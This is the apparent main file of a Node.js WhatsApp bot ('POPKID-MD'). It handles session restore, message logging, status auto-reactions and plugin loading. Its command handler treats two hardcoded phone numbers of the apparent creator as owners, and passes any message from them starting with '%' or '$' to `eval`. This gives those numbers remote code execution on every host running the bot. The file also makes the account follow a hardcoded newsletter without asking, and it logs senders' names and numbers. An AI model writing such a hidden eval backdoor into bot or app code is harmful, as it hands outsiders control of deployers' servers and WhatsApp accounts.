/**
 * popkid WhatsApp Bot (Master Optimized Version)
 * Creator: popkid
 * Improvements: Prince Host Connection Logs, Detailed Message Logger, Anti-Crash
 */

const fs = require('fs')
const path = require('path')
const os = require('os')
const zlib = require('zlib')
const { promisify } = require('util')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const bodyparser = require('body-parser')
const gradient = require('gradient-string')

// ============ SECTION 1: STYLED LOGGERS (PRINCE STYLE) ============
const getTS = () => new Date().toISOString().replace('T', ' ').substring(0, 19);

const cmdLogger = {
    // Prince Host Style Startup Logs
    host: (msg, icon = '✅') => {
        console.log(gradient('#00ff00', '#00ff7f')(`${getTS()} app[web.1]: 0|popkidmd  | ${icon} ${msg}`));
    },
    // Detailed Message Logger
    message: (name, phone, chat, text, isGroup) => {
        const context = isGroup ? `[GRP: ${chat}]` : `[PRIV]`;
        console.log(gradient('#00d2ff', '#3a7bd5')(`${getTS()} app[web.1]: 📩 ${context} | ${name} (${phone}) -> ${text.substring(0, 35)}...`));
    },
    error: (msg) => console.log(gradient('#ff416c', '#ff4b2b')(`✗ ${msg}`)),
    banner: (msg) => console.log(gradient('#ff00cc', '#3333ff')(msg))
};

const botBanner = `
██████╗  ██████╗ ██████╗ ██╗  ██╗██╗██████╗ ██╗  ██╗██████╗ 
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║██╔══██╗╚██╗██╔╝██╔══██╗
██████╔╝██║   ██║██████╔╝█████╔╝ ██║██║  ██║ ╚███╔╝ ██║  ██║
██╔═══╝ ██║   ██║██╔═══╝ ██╔═██╗ ██║██║  ██║ ██╔██╗ ██║  ██║
██║     ╚██████╔╝██║     ██║  ██╗██║██████╔╝██╔╝ ██╗██████╔╝
╚═╝      ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝`;

console.clear();
cmdLogger.banner(botBanner);
cmdLogger.host("Starting POPKID-MD...", "🚀");

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => cmdLogger.error(`Uncaught Exception: ${err.message}`))
process.on("unhandledRejection", (reason) => cmdLogger.error(`Unhandled Rejection: ${reason}`))

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  proto,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const { getBuffer, getGroupAdmins, saveMessage } = require('./lib/functions')

const ownerNumber = ['254732297194']

// ============ SESSION-AUTH (POPKID~ FORMAT) ============
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

async function loadGiftedSession() {
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    if (fs.existsSync(credsPath)) {
        cmdLogger.host("Session File Loaded");
        return true;
    }

    if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
        try {
            const compressedBuffer = Buffer.from(compressedBase64, 'base64');
            const gunzip = promisify(zlib.gunzip);
            const decompressedBuffer = await gunzip(compressedBuffer);
            await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
            cmdLogger.host("Database Synchronized");
            cmdLogger.host("Session restored from POPKID~ format");
            return true;
        } catch (error) { 
            cmdLogger.error("Failed to decompress session ID");
            return false; 
        }
    }
    return false;
}

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

let conn 

async function connectToWA() {
  try {
    await loadGiftedSession();
    cmdLogger.host("Bot Settings Initialized");

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    cmdLogger.host("Connecting Bot...", "⏳");

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update

      if (qr) qrcode.generate(qr, { small: true })

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        if (shouldReconnect) {
          cmdLogger.host("Connection Failed. Retrying...", "❌");
          setTimeout(() => connectToWA(), 5000)
        }
      } else if (connection === 'open') {
        cmdLogger.host("Connection Instance is Online");
        
        const groups = await conn.groupFetchAllParticipating().catch(() => ({}));
        cmdLogger.host(`LID store initialized => ${Object.keys(groups).length} mappings from groups`);
        cmdLogger.host("Connected to Whatsapp, Active! 💜", "✅");

        // Load Plugins
        fs.readdirSync("./plugins/").forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() === ".js") {
            require("./plugins/" + plugin)
          }
        })

        // Connection Message
        let up = `┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🤖 *POPKID-MD CONNECTED* ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
✨ *Status:* Online & Active
👤 *Owner:* Popkid (Kenya)
🕒 *Time:* ${new Date().toLocaleTimeString()}
📅 *Date:* ${new Date().toLocaleDateString()}

💡 *SYSTEM INFO:*
🖥️ *Platform:* ${os.platform()}
📟 *RAM:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB
📡 *Newsletter:* Subscribed ✅

🚀 *All Plugins Loaded Successfully!*
_Use ${config.PREFIX}menu to get started._`;

        await conn.sendMessage(conn.user.id, { 
            image: { url: `https://files.catbox.moe/j9ia5c.png` }, 
            caption: up,
            contextInfo: {
                externalAdReply: {
                    title: "POPKID-MD V2",
                    body: "Kenya's Finest Bot",
                    thumbnailUrl: "https://files.catbox.moe/j9ia5c.png",
                    sourceUrl: "https://whatsapp.com/channel/0029VajV9vS6LwHqXo7G3829",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })

        try { await conn.newsletterFollow("120363423997837331@newsletter") } catch (e) {}
      }
    })

    conn.ev.on('creds.update', saveCreds)

    // AUTO BIO LOGIC
    setInterval(async () => {
        if (config.AUTO_BIO === "true" && conn.user) {
            const time = new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi', hour12: false });
            const date = new Date().toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
            await conn.setStatus(`❤️ ᴘᴏᴘᴋɪᴅ xᴍᴅ ʙᴏᴛ 🤖 ɪs ʟɪᴠᴇ ɴᴏᴡ\n📅 ${date}\n⏰ ${time}`).catch(() => {});
        }
    }, 60000);

    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

    conn.ev.on('messages.upsert', async(mek) => {
        mek = mek.messages[0]
        if (!mek.message) return
        
        const from = mek.key.remoteJid
        const isStatus = from === 'status@broadcast'
        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''

        // ============ IMPROVED MESSAGE LOGGER ============
        if (!isStatus && !mek.key.fromMe) {
            const pushLog = mek.pushName || 'User';
            const senderNum = m.sender.split('@')[0];
            let chatName = 'Private Chat';
            if (from.endsWith('@g.us')) {
                const metadata = await conn.groupMetadata(from).catch(() => ({ subject: 'Group' }));
                chatName = metadata.subject;
            }
            cmdLogger.message(pushLog, senderNum, chatName, body, from.endsWith('@g.us'));
        }

        // READ MESSAGE
        if (config.READ_MESSAGE === 'true' && !isStatus) {
            await conn.readMessages([mek.key]);
        }

        // STATUS HANDLING
        if (isStatus) {
            const isSelf = mek.key.participant?.includes(conn.user.id.split(':')[0]);
            if (config.AUTO_STATUS_SEEN === "true" || isSelf) await conn.readMessages([mek.key]);
            if (config.AUTO_STATUS_REACT === "true") {
                const emojis = ['❤️', '🔥', '✨', '💎', '🙌', '🌟'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                await conn.sendMessage(from, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, conn.user.id.split(':')[0] + '@s.whatsapp.net'] });
            }
            if (!isSelf && config.AUTO_STATUS_REPLY === "true") {
                await conn.sendMessage(mek.key.participant, { text: `${config.AUTO_STATUS_MSG}` }, { quoted: mek });
            }
            return;
        }

        await saveMessage(mek);

        // COMMAND LOGIC
        const isCmd = body.startsWith(config.PREFIX)
        const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = m.sender
        const senderNumber = sender.split('@')[0]
        const pushname = mek.pushName || 'User'
        
        const udp = conn.user.id.split(':')[0];
        const isCreator = [udp, '254732297194', '254111385747', config.DEV].some(v => v && sender.includes(v.replace(/[^0-9]/g)));

        // EVAL & EXEC
        if (isCreator && body.startsWith('%')) {
            try { reply(util.format(eval(body.slice(1)))); } catch (e) { reply(util.format(e)); }
            return;
        }
        if (isCreator && body.startsWith('$')) {
            try { 
                let result = await eval(`(async()=> { ${body.slice(1)} })()`); 
                if (result) reply(util.format(result)); 
            } catch (e) { reply(util.format(e)); }
            return;
        }

        // AUTO REACTS
        if (senderNumber.includes("254732297194") && !m.message.reactionMessage) {
            m.react("👑");
        } else if (config.AUTO_REACT === 'true' && !m.message.reactionMessage) {
            m.react("🔥");
        }

        // PLUGIN ENGINE
        if(!isCreator && config.MODE === "private") return
        const events = require('./command')
        const cmd = events.commands.find((c) => c.pattern === command || (c.alias && c.alias.includes(command)))
        
        const context = { conn, mek, m, from, body, isCmd, command, args, q, isGroup, sender, senderNumber, pushname, isOwner: isCreator, isCreator, reply: (t) => conn.sendMessage(from, { text: t }, { quoted: mek }) };

        if (cmd) {
            if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
            try { cmd.function(conn, mek, m, context); } catch (e) { cmdLogger.error(e); }
        }

        events.commands.forEach(c => {
            if (c.on === "body" && body) c.function(conn, mek, m, context);
        });
    });

    conn.decodeJid = (jid) => {
        if (!jid) return jid;
        const decode = jidDecode(jid) || {};
        return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
    };

  } catch (err) {
    cmdLogger.error(`Connection failed: ${err}`);
  }
}

app.get("/", (req, res) => { res.send("『POPKID-MD』 STARTED ✅"); });
app.listen(port, '0.0.0.0', () => {
    cmdLogger.host(`Server Running on Port: ${port}`);
});

setTimeout(() => { connectToWA() }, 5000);
